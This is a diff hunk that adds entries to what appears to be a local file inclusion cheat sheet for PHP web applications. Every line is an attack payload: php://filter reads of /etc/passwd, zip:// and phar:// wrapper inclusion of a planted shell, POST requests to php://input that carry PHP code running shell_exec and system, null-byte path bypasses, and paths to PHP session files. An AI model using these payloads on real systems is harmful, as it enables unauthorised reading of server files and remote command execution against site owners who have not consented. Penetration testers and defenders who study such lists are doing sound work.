@@ -3,12 +3,22 @@
 ?page=php://filter/resource=/etc/passwd
 ?page=php://filter/convert.base64-encode/resource=/etc/passwd 
 ?page=zip://path/to/file.zip%23shell 
+?page=phar://path/to/file.zip%23shell 
 
+--php wrapper example 1
 POST page?php://input&cmd=ls HTTP/1.1
 ...
 ...
 <?php echo shell_exec($_GET['cmd']);?>
 
+--php wrapper example2 
+POST vuln.php?filename=php://input HTTP/1.1
+...
+...
+<?=system('ls')?>
 
 /etc/passwd%00
 /etc/passwd%2500
+
+--sessions
+/var/lib/phpX/sess_*
